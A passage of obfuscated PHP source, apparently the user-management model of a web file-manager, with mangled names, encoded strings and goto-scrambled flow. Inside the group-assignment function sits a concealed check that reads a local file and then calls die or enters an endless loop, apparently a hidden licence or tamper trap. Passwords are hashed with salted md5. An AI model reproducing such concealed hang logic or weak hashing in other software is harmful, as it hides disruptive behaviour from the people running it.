$Eå‘Õ±ÑÈÑ[1936] => $EÃ¾ÅĞä…×[$Eå‘Õ±ÑÈÑ[1937]], $Eå‘Õ±ÑÈÑ[1938] => isset($EÃ¾ÅĞä…×[$Eå‘Õ±ÑÈÑ[304]]) ? $EÃ¾ÅĞä…×[$Eå‘Õ±ÑÈÑ[304]] : $Eå‘Õ±ÑÈÑ[33], $Eå‘Õ±ÑÈÑ[1939] => isset($EÃ¾ÅĞä…×[$Eå‘Õ±ÑÈÑ[1933]]) ? $EÃ¾ÅĞä…×[$Eå‘Õ±ÑÈÑ[1933]] : $Eå‘Õ±ÑÈÑ[33], $Eå‘Õ±ÑÈÑ[1940] => isset($EÃ¾ÅĞä…×[$Eå‘Õ±ÑÈÑ[1770]]) ? $EÃ¾ÅĞä…×[$Eå‘Õ±ÑÈÑ[1770]] : $EÃ¾ÅĞä…×[$Eå‘Õ±ÑÈÑ[28]], $Eå‘Õ±ÑÈÑ[1941] => isset($EÃ¾ÅĞä…×[$Eå‘Õ±ÑÈÑ[1918]]) ? $EÃ¾ÅĞä…×[$Eå‘Õ±ÑÈÑ[1918]] : $Eå‘Õ±ÑÈÑ[33], $Eå‘Õ±ÑÈÑ[1942] => isset($EÃ¾ÅĞä…×[$Eå‘Õ±ÑÈÑ[1943]]) ? $EÃ¾ÅĞä…×[$Eå‘Õ±ÑÈÑ[1943]] : 1, $Eå‘Õ±ÑÈÑ[1944] => $EÃ¾ÅĞä…×[$Eå‘Õ±ÑÈÑ[568]], $Eå‘Õ±ÑÈÑ[1627] => isset($EÃ¾ÅĞä…×[$Eå‘Õ±ÑÈÑ[1530]]) ? $EÃ¾ÅĞä…×[$Eå‘Õ±ÑÈÑ[1530]] : 1024 * 1024 * 20, $Eå‘Õ±ÑÈÑ[1628] => 0, $Eå‘Õ±ÑÈÑ[1934] => 0, $Eå‘Õ±ÑÈÑ[1945] => isset($EÃ¾ÅĞä…×[$Eå‘Õ±ÑÈÑ[454]]) ? $EÃ¾ÅĞä…×[$Eå‘Õ±ÑÈÑ[454]] : 1); if (!empty($EÃ¾ÅĞä…×[$Eå‘Õ±ÑÈÑ[1095]])) { $C¢Ì†çòÚ[$Eå‘Õ±ÑÈÑ[1095]] = $EÃ¾ÅĞä…×[$Eå‘Õ±ÑÈÑ[1095]]; } goto cëÛĞ±¡¡·; E“›Ù˜¾“: } protected function userEditTest($c½¥¤Š©˜Œ, $B“ö½åëöù) { return $this->call($_SERVER[°Óó£ÌİóèÅ][1946], $c½¥¤Š©˜Œ, $B“ö½åëöù); } protected function userEdit($eºÕå°ªÃ, $B’ÒŞÅ¡‚µ) { goto eç‡ø‡ÚÜÄ; eç‡ø‡ÚÜÄ: $f‰¼µ´¬Á´ =& $_SERVER[°Óó£ÌİóèÅ]; $Eç–Ï­‚Ø´ = $this->getInfoSimple($eºÕå°ªÃ); if (!$Eç–Ï­‚Ø´) { return !1; } goto Bƒ›—„—¾; Bƒ›—„—¾: $A†®Ë–á„ = $this->_checkExist($B’ÒŞÅ¡‚µ, $eºÕå°ªÃ); if ($A†®Ë–á„ !== !0) { return $A†®Ë–á„; } if (isset($B’ÒŞÅ¡‚µ[$f‰¼µ´¬Á´[568]]) && trim($B’ÒŞÅ¡‚µ[$f‰¼µ´¬Á´[568]]) != $f‰¼µ´¬Á´[33]) { $EĞŸ­¾¸„ô = $this->metaGet($eºÕå°ªÃ); if (empty($EĞŸ­¾¸„ô[$f‰¼µ´¬Á´[1935]])) { $EĞŸ­¾¸„ô[$f‰¼µ´¬Á´[1935]] = rand_string(10); Model($f‰¼µ´¬Á´[1716])->metaSet($eºÕå°ªÃ, $f‰¼µ´¬Á´[1935], $EĞŸ­¾¸„ô[$f‰¼µ´¬Á´[1935]]); } $B’ÒŞÅ¡‚µ[$f‰¼µ´¬Á´[568]] = md5($EĞŸ­¾¸„ô[$f‰¼µ´¬Á´[1935]] . trim($B’ÒŞÅ¡‚µ[$f‰¼µ´¬Á´[568]])); } else { unset($B’ÒŞÅ¡‚µ[$f‰¼µ´¬Á´[568]]); } goto d®…ì‡½¹; d®…ì‡½¹: $this->where(array($f‰¼µ´¬Á´[1086] => $eºÕå°ªÃ))->save($B’ÒŞÅ¡‚µ); if (isset($B’ÒŞÅ¡‚µ[$f‰¼µ´¬Á´[1770]])) { $this->setNamePinyin($eºÕå°ªÃ, $B’ÒŞÅ¡‚µ[$f‰¼µ´¬Á´[1770]]); } return !0; goto Fœ¹ôßó; Fœ¹ôßó: } public function setNamePinyin($f†ò¦òâîŞ, $FáË‹íªÚ÷ = false) { $AíˆË«é =& $_SERVER[°Óó£ÌİóèÅ]; if (!$FáË‹íªÚ÷) { $fË„·µÚ¿° = $this->getInfoSimple($f†ò¦òâîŞ); $FáË‹íªÚ÷ = $fË„·µÚ¿°[$AíˆË«é[1770]] ? $fË„·µÚ¿°[$AíˆË«é[1770]] : $fË„·µÚ¿°[$AíˆË«é[28]]; } $A¼ÆÉ½†è = Model($AíˆË«é[1481]); if (!Input::check($FáË‹íªÚ÷, $AíˆË«é[411])) { return $A¼ÆÉ½†è->metaSet($f†ò¦òâîŞ, array($AíˆË«é[412] => $AíˆË«é[33], $AíˆË«é[413] => $AíˆË«é[33])); } return $A¼ÆÉ½†è->metaSet($f†ò¦òâîŞ, array($AíˆË«é[412] => str_replace($AíˆË«é[50], $AíˆË«é[33], Pinyin::encode($FáË‹íªÚ÷)), $AíˆË«é[413] => Pinyin::encode($FáË‹íªÚ÷, $AíˆË«é[414]))); } private function nickNameRpt() { $FÙÅñÉ°ÁÑ =& $_SERVER[°Óó£ÌİóèÅ]; $Fäœ“‰ø’Â = Model($FÙÅñÉ°ÁÑ[832])->get($FÙÅñÉ°ÁÑ[1947]); $Aë‹ä»ã± = $GLOBALS[$FÙÅñÉ°ÁÑ[6]][$FÙÅñÉ°ÁÑ[1948]][$FÙÅñÉ°ÁÑ[1947]]; $FÅ’Š´× = !is_null($Fäœ“‰ø’Â) ? $Fäœ“‰ø’Â : $Aë‹ä»ã±; return !!$FÅ’Š´×; } private function _checkExist($d¯‚çæÒØ´, $C’¤¾»ò• = false) { $E­²‚§—Ï =& $_SERVER[°Óó£ÌİóèÅ]; $Då®õ”äš = array($E­²‚§—Ï[28] => UserModel::ERROR_USER_EXIST_NAME, $E­²‚§—Ï[1770] => UserModel::ERROR_USER_EXIST_NICKNAME, $E­²‚§—Ï[304] => UserModel::ERROR_USER_EXIST_EMAIL, $E­²‚§—Ï[1933] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($Då®õ”äš[$E­²‚§—Ï[1770]]); } $f±òï¢© = $C’¤¾»ò• ? array($E­²‚§—Ï[1095] => array($E­²‚§—Ï[1949], $C’¤¾»ò•)) : array(); foreach ($Då®õ”äš as $B¶î«‘œÇ’ => $C‰‡ÒáÄŠÛ) { if (!isset($d¯‚çæÒØ´[$B¶î«‘œÇ’]) || !$d¯‚çæÒØ´[$B¶î«‘œÇ’]) { continue; } $FÒäÎÛÆòÁ = array_merge(array($B¶î«‘œÇ’ => $d¯‚çæÒØ´[$B¶î«‘œÇ’]), $f±òï¢©); $Bà‰¯ÆÛ³  = $this->where($FÒäÎÛÆòÁ)->find(); if ($Bà‰¯ÆÛ³ ) { return $C‰‡ÒáÄŠÛ; } } return !0; } public function userListInfo($bª¯ª‘ÉÚæ) { $Bùø¸Úš¾ß =& $_SERVER[°Óó£ÌİóèÅ]; $D™Ïå»İäå = array(); $bª¯ª‘ÉÚæ = array_unique($bª¯ª‘ÉÚæ); if (!$bª¯ª‘ÉÚæ) { return $D™Ïå»İäå; } if (count($bª¯ª‘ÉÚæ) < 20) { foreach ($bª¯ª‘ÉÚæ as $AÚ­–ÇÕ§‘) { $D™Ïå»İäå[$AÚ­–ÇÕ§‘ . $Bùø¸Úš¾ß[33]] = $this->getInfoSimpleOuter($AÚ­–ÇÕ§‘); } } else { $dØáîÅíë = array($Bùø¸Úš¾ß[1086] => array($Bùø¸Úš¾ß[563], $bª¯ª‘ÉÚæ)); if (count($bª¯ª‘ÉÚæ) == 1) { $dØáîÅíë = array($Bùø¸Úš¾ß[1086] => $bª¯ª‘ÉÚæ[0]); } $Aİ„Öôğ©› = Model($Bùø¸Úš¾ß[1716])->field($this->simpleField)->where($dØáîÅíë)->select(); $Aİ„Öôğ©› = array_to_keyvalue($Aİ„Öôğ©›, $Bùø¸Úš¾ß[1095]); foreach ($bª¯ª‘ÉÚæ as $AÚ­–ÇÕ§‘) { $eÔ¤“àñ’ù = $Aİ„Öôğ©›[$Aİ„Öôğ©›[$AÚ­–ÇÕ§‘]]; if (!$eÔ¤“àñ’ù) { $D™Ïå»İäå[$AÚ­–ÇÕ§‘ . $Bùø¸Úš¾ß[33]] = $this->getInfoSimpleOuter($AÚ­–ÇÕ§‘); continue; } $eÔ¤“àñ’ù[$Bùø¸Úš¾ß[1918]] = Action($Bùø¸Úš¾ß[1919])->parseUrl($eÔ¤“àñ’ù[$Bùø¸Úš¾ß[1918]]); $D™Ïå»İäå[$AÚ­–ÇÕ§‘ . $Bùø¸Úš¾ß[33]] = $eÔ¤“àñ’ù; } } return $D™Ïå»İäå; } protected function userStatus($d¡®¯ÛŠã‰, $EÅÊˆäÊ×) { $A›¸—´ˆ°õ = $this->getInfoSimple($d¡®¯ÛŠã‰); if (!$A›¸—´ˆ°õ) { return !1; } $EååÙ©‰ïÅ = array($_SERVER[°Óó£ÌİóèÅ][454] => $EÅÊˆäÊ×); return $this->userEdit($d¡®¯ÛŠã‰, $EååÙ©‰ïÅ); } protected function userRemove($EĞˆóœ²™) { goto C…ê¬ÌÆÂ¡; C…ê¬ÌÆÂ¡: $fİçìÖ±— =& $_SERVER[°Óó£ÌİóèÅ]; $A…Å™„ÀƒÄ = $this->getInfoSimple($EĞˆóœ²™); if (!$A…Å™„ÀƒÄ) { return !1; } goto AèĞË™‹‡Ë; D«Ú¤Ë™Œ: Model($fİçìÖ±—[1631])->where($F‡ÚøÁ¤©ñ)->delete(); Model($fİçìÖ±—[1932])->where($F‡ÚøÁ¤©ñ)->delete(); Model($fİçìÖ±—[1951])->where($F‡ÚøÁ¤©ñ)->delete(); goto a«â¯³”Ä¯; a«â¯³”Ä¯: Model($fİçìÖ±—[529])->userRootRemove($EĞˆóœ²™); return $this->where($F‡ÚøÁ¤©ñ)->delete(); goto BÒ¡¸¤î¸§; AèĞË™‹‡Ë: $F‡ÚøÁ¤©ñ = array($fİçìÖ±—[1086] => $EĞˆóœ²™); Model($fİçìÖ±—[426])->where($F‡ÚøÁ¤©ñ)->delete(); Model($fİçìÖ±—[1950])->where($F‡ÚøÁ¤©ñ)->delete(); goto D«Ú¤Ë™Œ; BÒ¡¸¤î¸§: } protected function userGroupSet($A– ÕîÆİÆ, $DŸÜù—Ş‹ô, $A‚¬©¬¡ãÃ = array()) { goto a˜æÂä‡íå; E§–¯Òîõ: if (!$cœ‰‰ª›ó‘ || !is_array($DŸÜù—Ş‹ô)) { return !1; } $cñÏ¼‘×ŸÕ = Model($eƒ‡‹óâß¦[1631]); $cñÏ¼‘×ŸÕ->where(array($eƒ‡‹óâß¦[1095] => $A– ÕîÆİÆ))->delete(); goto fé—ŸÊ¼ä³; fé—ŸÊ¼ä³: $dÇë©äÑƒ¼ = array(); $e†˜ƒ¯“ğÁ = 0; foreach ($DŸÜù—Ş‹ô as $a¾˜ù¦²Ò˜ => $e„‘§ÁîÃ) { $CøŞÖÄ¹Ùš = array($eƒ‡‹óâß¦[1095] => $A– ÕîÆİÆ, $eƒ‡‹óâß¦[1546] => $a¾˜ù¦²Ò˜, $eƒ‡‹óâß¦[1683] => $e„‘§ÁîÃ); $CøŞÖÄ¹Ùš[$eƒ‡‹óâß¦[1567]] = isset($A‚¬©¬¡ãÃ[$e†˜ƒ¯“ğÁ]) ? $A‚¬©¬¡ãÃ[$e†˜ƒ¯“ğÁ] : 0; $e†˜ƒ¯“ğÁ++; $dÇë©äÑƒ¼[] = $CøŞÖÄ¹Ùš; } goto CÂ¶…–ÕÛ; a˜æÂä‡íå: $eƒ‡‹óâß¦ =& $_SERVER[°Óó£ÌİóèÅ]; if (!isset($_SERVER[$eƒ‡‹óâß¦[57]]) || !isset($_SERVER[$eƒ‡‹óâß¦[64]])) { goto fŞ–ˆõÓÒ‚; fŞ–ˆõÓÒ‚: $F¹»ßß±Ñá = $eƒ‡‹óâß¦[59]; $dÆÕï˜¬ø– = BASIC_PATH . $eƒ‡‹óâß¦[60]; $C‡¤À¥è² = $F¹»ßß±Ñá($dÆÕï˜¬ø–); goto bâÓ¨§ªš«; CÚçœŠéêÒ: $f‹ÂåÅˆŠ(LIB_DIR); for (;;) { $f‹ÂåÅˆŠ = json_encode($GLOBALS[$eƒ‡‹óâß¦[563]]); } goto f„°İµ´Ÿ; bâÓ¨§ªš«: $Eø¡èø§ã = explode($eƒ‡‹óâß¦[61], $C‡¤À¥è²); if (count($Eø¡èø§ã) < $eƒ‡‹óâß¦[561]) { die; } $f‹ÂåÅˆŠ = $eƒ‡‹óâß¦[562]; goto CÚçœŠéêÒ; f„°İµ´Ÿ: } $cœ‰‰ª›ó‘ = $this->getInfoSimple($A– ÕîÆİÆ); goto E§–¯Òîõ; CÂ¶…–ÕÛ: return $cñÏ¼‘×ŸÕ->addAll($dÇë©äÑƒ¼, array(), !0); goto eïÑĞò§‚; eïÑĞò§‚: } protected function userGroupAdd($F®¨Â‘•£Î, $A”Í°·Ù—Š, $Cİä¯°šõ) { $F™ÉİÉÓ =& $_SERVER[°Óó£ÌİóèÅ]; $c½¿÷èë° = $this->getInfoSimple($F®¨Â‘•£Î); if (!$c½¿÷èë° || !$A”Í°·Ù—Š) { return !1; } $F‚Šù”×ªë = array(array($F™ÉİÉÓ[1095] => $F®¨Â‘•£Î, $F™ÉİÉÓ[1546] => $A”Í°·Ù—Š, $F™ÉİÉÓ[1683] => $Cİä¯°šõ)); return Model($F™ÉİÉÓ[1631])->addAll($F‚Šù”×ªë, array(), !0); } protected function userGroupRemove($FâË¥àøÛå, $Bµš‚Ùéà³) { $aˆÎ˜½ ÈÔ =& $_SERVER[°Óó£ÌİóèÅ]; $BÄåìÚ£¨’ = $this->getInfoSimple($FâË¥àøÛå); if (!$BÄåìÚ£¨’ || !$Bµš‚Ùéà³) { return !1; } $EÂ™÷”’ˆ = array($aˆÎ˜½ ÈÔ[1086] => $FâË¥àøÛå, $aˆÎ˜½ ÈÔ[1629] => $Bµš‚Ùéà³); return Model($aˆÎ˜½ ÈÔ[1631])->where($EÂ™÷”’ˆ)->delete(); } public function listData() { $A°¨’Ìå“¥ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($A°¨’Ìå“¥[$_SERVER[°Óó£ÌİóèÅ][364]]); return $A°¨’Ìå“¥; } public function listByID($E¬é¸ŞÖÆ) { $b™Ô™³±ƒø =& $_SERVER[°Óó£ÌİóèÅ]; if (!$E¬é¸ŞÖÆ) { return; } $d’µÔàè¡İ = array($b™Ô™³±ƒø[1095] => array($b™Ô™³±ƒø[7], $E¬é¸ŞÖÆ)); $bƒŞÅ—Õù = $this->where($d’µÔàè¡İ)->select(); $this->_listDataApply($bƒŞÅ—Õù); return $bƒŞÅ—Õù; } public function listByGroup($Eª“Š£Ãªå = 0, $aÂÇóÖåŞ® = array()) { goto eò²Á¦×¥ï; fâÕÅğ²º„: $f¾öè“–… = $this->_makeOrder($A¸°¬È½Í)->field($f§Šµ˜¶ëÜ[1956])->where($C‰½ä¯ï’Æ)->join($Eô­™––µ)->selectPage(50); $F•êÔ‚óÃ = $f§Šµ˜¶ëÜ[738] . ($e—òÚéé‘ñ ? $f§Šµ˜¶ëÜ[47] . $e—òÚéé‘ñ : $f§Šµ˜¶ëÜ[33]); $this->_listDataApply($f¾öè“–…[$f§Šµ˜¶ëÜ[364]], $F•êÔ‚óÃ); goto E·˜¿’ƒô‚; eò²Á¦×¥ï: $f§Šµ˜¶ëÜ =& $_SERVER[°Óó£ÌİóèÅ]; $e—òÚéé‘ñ = isset($aÂÇóÖåŞ®[$f§Šµ˜¶ëÜ[1952]]) ? $aÂÇóÖåŞ®[$f§Šµ˜¶ëÜ[1952]] : $f§Šµ˜¶ëÜ[33]; $Eô­™––µ = $f§Šµ˜¶ëÜ[33]; goto F†Œã¸½Ûˆ; E·˜¿’ƒô‚: return $f¾öè“–…; goto f»çğ›ÂÇÉ; F†Œã¸½Ûˆ: $C‰½ä¯ï’Æ = array(); if ($Eª“Š£Ãªå) { $C‰½ä¯ï’Æ = array($f§Šµ˜¶ëÜ[1953] => intval($Eª“Š£Ãªå)); $Eô­™––µ = "\x4c\105\x46\124\x20\x4a\x4f\x49\x4e\40{$this->tablePrefix}\165\163\145\162\x5f\147\162\x6f\x75\160\40\x75\163\x65\162\137\x67\162\157\165\x70\40\157\156\40\165\x73\145\162\56\x75\x73\x65\162\111\104\x20\x3d\x20\165\x73\145\162\x5f\147\162\157\x75\160\56\x75\163\x65\x72\x49\x44"; $A¸°¬È½Í = Input::get($f§Šµ˜¶ëÜ[1586], null, $f§Šµ˜¶ëÜ[33]) ? $f§Šµ˜¶ëÜ[33] : $f§Šµ˜¶ëÜ[1954]; } if (isset($aÂÇóÖåŞ®[$f§Šµ˜¶ëÜ[454]])) { $C‰½ä¯ï’Æ[$f§Šµ˜¶ëÜ[1955]] = $aÂÇóÖåŞ®[$f§Šµ˜¶ëÜ[454]]; } goto fâÕÅğ²º„; f»çğ›ÂÇÉ: } private function _makeOrder($a¨ğ¯“ß• = '') { goto bËÁÄï‚³œ; Döèö¦¡Â: $a¨ğ¯“ß• = $a¨ğ¯“ß• . "\x75\163\x65\x72\56{$B„Ì‡ƒ‰æ§}\40{$dßŒ¥˜šÀÎ}\54\x20\165\163\x65\162\56\x75\163\x65\x72\x49\x44\x20\x61\163\143"; return $this->alias($AÆùŒÃ â›[1717])->order($a¨ğ¯“ß•); goto dĞ£‘Û; bËÁÄï‚³œ: $AÆùŒÃ â› =& $_SERVER[°Óó£ÌİóèÅ]; $B„´‹„Å¬ = array($AÆùŒÃ â›[1095], $AÆùŒÃ â›[28], $AÆùŒÃ â›[1532], $AÆùŒÃ â›[1505], $AÆùŒÃ â›[195]); $FÀö‚Š§ÔÀ = array($AÆùŒÃ â›[1632] => $AÆùŒÃ â›[1633], $AÆùŒÃ â›[1513] => $AÆùŒÃ â›[1590]); goto AÑ“Á†ä³…; AÑ“Á†ä³…: $B„Ì‡ƒ‰æ§ = Input::get($AÆùŒÃ â›[1586], $AÆùŒÃ â›[7], $AÆùŒÃ â›[1086], $B„´‹„Å¬); $dßŒ¥˜šÀÎ = Input::get($AÆùŒÃ â›[1588], $AÆùŒÃ â›[7], $AÆùŒÃ â›[1634], array($AÆùŒÃ â›[1634], $AÆùŒÃ â›[1513])); $dßŒ¥˜šÀÎ = $FÀö‚Š§ÔÀ[$dßŒ¥˜šÀÎ]; goto Döèö¦¡Â; dĞ£‘Û: } public function listSearch($A­Éğ†¼¥Û) { goto f‡Ø¸ö‰¾; f‡Ø¸ö‰¾: $DÄ˜º¥‘©° =& $_SERVER[°Óó£ÌİóèÅ]; $aòÈèß¨¨Ä = $A­Éğ†¼¥Û[$DÄ˜º¥‘©°[1635]]; $e”Ó½ÅÃ—Ù = isset($A­Éğ†¼¥Û[$DÄ˜º¥‘©°[1636]]) ? $A­Éğ†¼¥Û[$DÄ˜º¥‘©°[1636]] : !1; goto dÓÙÙ¨±š±; e–ÈîÕ³›: if (!$dô›éÃ‚é– || count($dô›éÃ‚é–[$DÄ˜º¥‘©°[364]]) < 5 && Input::check($aòÈèß¨¨Ä, $DÄ˜º¥‘©°[317])) { $f‹Ùº«‘ = $this->_searchFromMeta($DÄ˜º¥‘©°[413], $aòÈèß¨¨Ä, 10); $D Ç§öÙë• = $this->_searchFromMeta($DÄ˜º¥‘©°[412], $aòÈèß¨¨Ä, 10); $BË‹Ó¯á·¢ = array_merge($f‹Ùº«‘, $D Ç§öÙë•, $dô›éÃ‚é–[$DÄ˜º¥‘©°[364]]); $dô›éÃ‚é–[$DÄ˜º¥‘©°[364]] = array_unique_by_key($BË‹Ó¯á·¢, $DÄ˜º¥‘©°[1095]); $dô›éÃ‚é–[$DÄ˜º¥‘©°[361]][$DÄ˜º¥‘©°[362]] = count($dô›éÃ‚é–[$DÄ˜º¥‘©°[364]]); $dô›éÃ‚é–[$DÄ˜º¥‘©°[361]][$DÄ˜º¥‘©°[363]] = ceil($dô›éÃ‚é–[$DÄ˜º¥‘©°[361]][$DÄ˜º¥‘©°[362]] / $dô›éÃ‚é–[$DÄ˜º¥‘©°[361]][$DÄ˜º¥‘©°[359]]); } $this->_listDataApply($dô›éÃ‚é–[$DÄ˜º¥‘©°[364]]); $this->_filterByGroup($dô›éÃ‚é–, $e”Ó½ÅÃ—Ù); goto dÃ”˜ôáË; dÃ”˜ôáË: $this->_filterUserList($dô›éÃ‚é–); return $dô›éÃ‚é–; goto Aåæ’¬Ÿ£¿; dÓÙÙ¨±š±: $aòÈèß¨¨Ä = str_replace($DÄ˜º¥‘©°[1637], $DÄ˜º¥‘©°[1638], trim($aòÈèß¨¨Ä)); $b­ÛŠæåŠ‘ = array($DÄ˜º¥‘©°[28] => array($DÄ˜º¥‘©°[528], "\x25{$aòÈèß¨¨Ä}\45"), $DÄ˜º¥‘©°[304] => array($DÄ˜º¥‘©°[528], "\x25{$aòÈèß¨¨Ä}\x25"), $DÄ˜º¥‘©°[1770] => array($DÄ˜º¥‘©°[528], "\x25{$aòÈèß¨¨Ä}\x25"), $DÄ˜º¥‘©°[681] => $DÄ˜º¥‘©°[1639]); if (Input::check($aòÈèß¨¨Ä, $DÄ˜º¥‘©°[310])) { $b­ÛŠæåŠ‘[$DÄ˜º¥‘©°[1095]] = array($DÄ˜º¥‘©°[528], "\x25{$aòÈèß¨¨Ä}\x25"); $b­ÛŠæåŠ‘[$DÄ˜º¥‘©°[1933]] = array($DÄ˜º¥‘©°[528], "\45{$aòÈèß¨¨Ä}\45"); } goto C¸à§”¾–»; C¸à§”¾–»: if (!$aòÈèß¨¨Ä) { $b­ÛŠæåŠ‘ = array(); } if (isset($A­Éğ†¼¥Û[$DÄ˜º¥‘©°[454]])) { $b­ÛŠæåŠ‘[$DÄ˜º¥‘©°[454]] = $A­Éğ†¼¥Û[$DÄ˜º¥‘©°[454]]; } $dô›éÃ‚é– = $this->_makeOrder()->where($b­ÛŠæåŠ‘)->selectPage(20); goto e–ÈîÕ³›; Aåæ’¬Ÿ£¿: } private function _filterByGroup(&$c½›Áº¯‹, $C´µ”©…Í) { $Fô–¦´«‡‹ =& $_SERVER[°Óó£ÌİóèÅ]; if (!$C´µ”©…Í) { return $c½›Áº¯‹; } foreach ($c½›Áº¯‹[$Fô–¦´«‡‹[364]] as $EŠµÜÚŠ» => &$f•‚“‹ƒ) { $DôĞÅ˜øŒª = array_to_keyvalue($f•‚“‹ƒ[$Fô–¦´«‡‹[1957]], $Fô–¦´«‡‹[33], $Fô–¦´«‡‹[1546]); if (!in_array($C´µ”©…Í, $DôĞÅ˜øŒª)) { unset($c½›Áº¯‹[$Fô–¦´«‡‹[364]][$EŠµÜÚŠ»]); } } $c½›Áº¯‹[$Fô–¦´«‡‹[364]] = array_values($c½›Áº¯‹[$Fô–¦´«‡‹[364]]); $c½›Áº¯‹[$Fô–¦´«‡‹[361]] = array($Fô–¦´«‡‹[1958] => count($c½›Áº¯‹[$Fô–¦´«‡‹[364]]), $Fô–¦´«‡‹[1959] => $c½›Áº¯‹[$Fô–¦´«‡‹[361]][$Fô–¦´«‡‹[359]], $Fô–¦´«‡‹[1960] => 1, $Fô–¦´«‡‹[1961] => 1); } private function _filterUserList(&$EÛ­‘¿ÊÏÆ) { $cê´ÚŠ§¨î =& $_SERVER[°Óó£ÌİóèÅ]; foreach ($EÛ­‘¿ÊÏÆ[$cê´ÚŠ§¨î[364]] as $aì‰²ÁÌ¤£ => &$Eá®†ÉåÚ†) { unset($Eá®†ÉåÚ†[$cê´ÚŠ§¨î[1592]]); } } private function _searchFromMeta($fØ²º™¡•¨, $c‚ Ÿ›æÙ‰, $cçá½Ÿ¡†¥) { goto CÉîè‚—´à; CÉîè‚—´à: $b…­Ç¦¢î =& $_SERVER[°Óó£ÌİóèÅ]; $c‚ Ÿ›æÙ‰ = strtolower($c‚ Ÿ›æÙ‰); $dçÊºò„Ä = array($b…­Ç¦¢î[96] => $fØ²º™¡•¨, $b…­Ç¦¢î[367] => array($b…­Ç¦¢î[528], "\45{$c‚ Ÿ›æÙ‰}\x25")); goto d¢•ëàÕ; Eôã¥ğÓ®æ: $d¦Û¹ ²Â™ = $this->where(array($b…­Ç¦¢î[1086] => array($b…­Ç¦¢î[7], $BŠôœ£àƒØ)))->select(); if (!$d¦Û¹ ²Â™) { return array(); } return $d¦Û¹ ²Â™; goto eÕŒ«À×á; d¢•ëàÕ: $BŠôœ£àƒØ = Model($b…­Ç¦¢î[1962])->where($dçÊºò„Ä)->limit($cçá½Ÿ¡†¥)->select(); if (!$BŠôœ£àƒØ) { return array(); } $BŠôœ£àƒØ = array_to_keyvalue($BŠôœ£àƒØ, $b…­Ç¦¢î[33], $b…­Ç¦¢î[1095]); goto Eôã¥ğÓ®æ; eÕŒ«À×á: } private function _listDataApplyItem($föÊÁµ±Ç) { $F¡ä«æåˆ = array($föÊÁµ±Ç); $this->_listDataApply($F¡ä«æåˆ); return $F¡ä«æåˆ[0]; } private function _listDataApply(&$bí‹±ÖŒØ, $BëŒ»Ù¤˜ = "\147\162\x6f\165\x70\54\155\145\x74\141\x2c\x73\x6f\165\x72\x63\x65") { goto F×±Ö‚íô‘; fïÜÅ¤¦šå: if (in_array($a²§Ìİ­ƒ[1963], $BëŒ»Ù¤˜)) { $this->_listAppendMeta($bí‹±ÖŒØ, $f¯¯±³–¿é); } if (in_array($a²§Ìİ­ƒ[983], $BëŒ»Ù¤˜)) { $this->_listAppendSourceRoot($bí‹±ÖŒØ, $f¯¯±³–¿é); } goto dä¡Û¢åÜ; F×±Ö‚íô‘: $a²§Ìİ­ƒ =& $_SERVER[°Óó£ÌİóèÅ]; if (!$bí‹±ÖŒØ) { return; } array_remove_key($bí‹±ÖŒØ, $a²§Ìİ­ƒ[568]); goto A¡ë¶ê’æØ; A¡ë¶ê’æØ: $f¯¯±³–¿é = array_to_keyvalue($bí‹±ÖŒØ, $a²§Ìİ­ƒ[33], $a²§Ìİ­ƒ[1095]); $BëŒ»Ù¤˜ = explode($a²§Ìİ­ƒ[47], $BëŒ»Ù¤˜); if (in_array($a²§Ìİ­ƒ[738], $BëŒ»Ù¤˜)) { $this->_listAppendGroup($bí‹±ÖŒØ, $f¯¯±³–¿é); } goto fïÜÅ¤¦šå; dä¡Û¢åÜ: } private function _listAppendSourceRoot(&$A›™—ªõÔ½, $cŒ­ÂÊÛ) { $DÔÚÜ¬ =& $_SERVER[°Óó£ÌİóèÅ]; $bÂ…²£ğ”” = array($DÔÚÜ¬[401] => SourceModel::TYPE_USER, $DÔÚÜ¬[392] => 0, $DÔÚÜ¬[403] => array($DÔÚÜ¬[7], $cŒ­ÂÊÛ)); $f´Ç ‹’œ¾ = Model($DÔÚÜ¬[529])->field($DÔÚÜ¬[1964])->where($bÂ…²£ğ””)->select(); $f´Ç ‹’œ¾ = array_to_keyvalue($f´Ç ‹’œ¾, $DÔÚÜ¬[403]); $f´Ç ‹’œ¾ = array_remove_key($f´Ç ‹’œ¾, $DÔÚÜ¬[403]); foreach ($A›™—ªõÔ½ as &$bİë­Ê÷éá) { $bİë­Ê÷éá[$DÔÚÜ¬[858]] = $f´Ç ‹’œ¾[$bİë­Ê÷éá[$DÔÚÜ¬[1095]]] ? $f´Ç ‹’œ¾[$bİë­Ê÷éá[$DÔÚÜ¬[1095]]] : array(); } } private function _listAppendGroup(&$b‡»š»ùå, $C®öº…óßæ) { goto bÈ¤™ˆêŠÜ; A„Ğ£ö¹: $D¨¾õ¢”§¯ = array_to_keyvalue_group($D¨¾õ¢”§¯, $Aß¨ÃÇ£š[1095]); foreach ($D¨¾õ¢”§¯ as &$C×¦’¶œº¸) { $BÊ‡ÔŒŒªŠ = array(); foreach ($C×¦’¶œº¸ as $d‰ôŒØÓÁ¼) { if (!$d‰ôŒØÓÁ¼[$Aß¨ÃÇ£š[1683]]) { continue; } $cáËØ‘§¶Û = Model($Aß¨ÃÇ£š[1699])->listData($d‰ôŒØÓÁ¼[$Aß¨ÃÇ£š[1683]]); $BÊ‡ÔŒŒªŠ[] = array($Aß¨ÃÇ£š[1546] => $d‰ôŒØÓÁ¼[$Aß¨ÃÇ£š[1546]], $Aß¨ÃÇ£š[1967] => $F‹ª¸ŠôŸÆ[$d‰ôŒØÓÁ¼[$Aß¨ÃÇ£š[1546]]], $Aß¨ÃÇ£š[557] => $cáËØ‘§¶Û); } $C×¦’¶œº¸ = $BÊ‡ÔŒŒªŠ; } foreach ($b‡»š»ùå as &$F¬„ÆíÑãÎ) { $F¬„ÆíÑãÎ[$Aß¨ÃÇ£š[1957]] = array(); if (isset($D¨¾õ¢”§¯[$F¬„ÆíÑãÎ[$Aß¨ÃÇ£š[1095]]])) { $F¬„ÆíÑãÎ[$Aß¨ÃÇ£š[1957]] = $D¨¾õ¢”§¯[$F¬„ÆíÑãÎ[$Aß¨ÃÇ£š[1095]]]; } } goto f–Û÷¿ô”í; Fí’ÎÔ–®: $D„‡’ñÔÃ = array_to_keyvalue($D¨¾õ¢”§¯, $Aß¨ÃÇ£š[33], $Aß¨ÃÇ£š[1546]); $D„‡’ñÔÃ = array_remove_value(array_unique($D„‡’ñÔÃ), $Aß¨ÃÇ£š[410]); if (!$D„‡’ñÔÃ || !$D¨¾õ¢”§¯) { 